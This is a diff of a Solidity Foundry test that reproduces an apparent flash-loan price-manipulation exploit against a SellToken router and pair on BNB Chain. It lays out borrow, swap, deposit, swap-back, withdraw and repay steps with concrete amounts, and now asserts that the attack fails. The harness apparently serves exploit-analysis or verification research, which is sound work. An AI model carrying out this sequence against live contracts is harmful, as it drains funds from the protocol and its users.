@@ -264,35 +264,105 @@ contract SellTokenTestBase is Test, BlockLoader {
         srouter.withdraw(address(sellc));
     }
 
+    // function test_gt() public {
+    //     vm.startPrank(attacker);
+    //     vm.warp(blockTimestamp);
+    //     vm.roll(26854757);
+    //     emit log_named_uint("amt0", 428 ether);
+    //     borrow_wbnb_owner(428 ether);
+    //     printBalance("After step0 ");
+    //     emit log_named_uint(
+    //         "amt1",
+    //         (wbnb.balanceOf(address(attacker)) * 99) / 100
+    //     );
+    //     emit log_named_uint("amt2", 5000000 ether);
+    //     swap_pair_attacker_wbnb_sellc(
+    //         (wbnb.balanceOf(address(attacker)) * 99) / 100,
+    //         pair.getAmountOut((wbnb.balanceOf(address(attacker)) * 99) / 100, address(wbnb))
+    //     );
+    //     printBalance("After step1 ");
+    //     emit log_named_uint("amt3", 4 ether);
+    //     emit log_uint(srouter.getTokenPrice(address(sellc), address(wbnb), 1));
+    //     emit log_uint(wbnb.balanceOf(address(srouter.mkt())) / 1e18);
+    //     deposit_srouter_wbnb_sellc(4 ether);
+    //     printBalance("After step2 ");
+    //     emit log_named_uint("amt4", sellc.balanceOf(address(attacker)));
+    //     emit log_uint(wbnb.balanceOf(address(srouter.mkt())) / 1e18);
+    //     emit log_named_uint(
+    //         "amt5",
+    //         pair.getAmountOut(
+    //             sellc.balanceOf(address(attacker)),
+    //             address(sellc)
+    //         )
+    //     );
+    //     swap_pair_attacker_sellc_wbnb(
+    //         sellc.balanceOf(address(attacker)),
+    //         pair.getAmountOut(
+    //             sellc.balanceOf(address(attacker)),
+    //             address(sellc)
+    //         )
+    //     );
+    //     emit log_uint(srouter.getTokenPrice(address(sellc), address(wbnb), 1));
+    //     emit log_uint(wbnb.balanceOf(address(srouter.mkt())) / 1e18);
+    //     printBalance("After step3 ");
+    //     emit log_named_uint("amt6", 0);
+    //     withdraw_srouter_sellc_wbnb(0);
+    //     printBalance("After step4 ");
+    //     emit log_named_uint("amt7", 428 ether);
+    //     payback_wbnb_owner(428 ether);
+    //     printBalance("After step5 ");
+    //     require(attackGoal(), "Attack failed!");
+    //     vm.stopPrank();
+    // }
+
     function test_gt() public {
+uint256 amt0 = 428 ether;
+uint256 amt1 = 9.0389862878056 ether;
+uint256 amt2 = 199633.910696926 ether;
+uint256 amt3 = 30 ether;
+uint256 amt4 = 196608.0 ether;
+uint256 amt5 = 8.28125 ether;
+uint256 amt6 = 1 ether;
+uint256 amt7 = 428 ether;
+
+        // uint256 amt0 = 0x1733b1745bdb300000;
+        // uint256 amt1 = 0x16eed864ac11ff0000;
+        // uint256 amt2 = 0x4324ce2fa91d140000000;
+        // uint256 amt3 = 0xde0b6b3a7640000;
+        // uint256 amt4 = 0x4300f21b642ed00000000;
+        // uint256 amt5 = 0x16d28c757247740000;
+        // uint256 amt6 = 0xde0b6b3a7640000;
+        // uint256 amt7 = 0x173aa1cfb5aee20000;
+
         vm.startPrank(attacker);
         vm.warp(blockTimestamp);
         vm.roll(26854757);
-        borrow_wbnb_owner(428 ether);
+        vm.assume(amt7 >= amt0);
+        borrow_wbnb_owner(amt0);
         printBalance("After step0 ");
-        swap_pair_attacker_wbnb_sellc(
-            (wbnb.balanceOf(address(attacker)) * 99) / 100,
-            5000000 ether
-        );
+        emit log_uint(sellc.balanceOf(address(srouter.mkt())));
+        swap_pair_attacker_wbnb_sellc(amt1, amt2);
         printBalance("After step1 ");
-        deposit_srouter_wbnb_sellc(4 ether);
+        emit log_uint(srouter.getTokenPrice(address(sellc), address(wbnb), 1));
+        emit log_uint(sellc.balanceOf(address(srouter.mkt())));
+        emit log_uint(wbnb.balanceOf(address(srouter.mkt())));
+        emit log_named_uint("amt3", amt3);
+  
+        deposit_srouter_wbnb_sellc(amt3);
         printBalance("After step2 ");
-        swap_pair_attacker_sellc_wbnb(
-            sellc.balanceOf(address(attacker)),
-            pair.getAmountOut(
-                sellc.balanceOf(address(attacker)),
-                address(sellc)
-            )
-        );
+        emit log_uint(wbnb.balanceOf(address(srouter.mkt())));
+        swap_pair_attacker_sellc_wbnb(amt4, amt5);
         printBalance("After step3 ");
-        withdraw_srouter_sellc_wbnb(0);
+        emit log_uint(srouter.getTokenPrice(address(sellc), address(wbnb), 1));
+        emit log_uint(wbnb.balanceOf(address(srouter.mkt())));
+        withdraw_srouter_sellc_wbnb(amt6);
         printBalance("After step4 ");
-        payback_wbnb_owner(428 ether);
+        emit log_named_uint("amt7", amt7);
+        payback_wbnb_owner(amt7);
         printBalance("After step5 ");
-        require(attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
-
     function check_gt(
         uint256 amt0,
         uint256 amt1,
@@ -313,7 +383,7 @@ contract SellTokenTestBase is Test, BlockLoader {
         swap_pair_attacker_sellc_wbnb(amt4, amt5);
         withdraw_srouter_sellc_wbnb(amt6);
         payback_wbnb_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
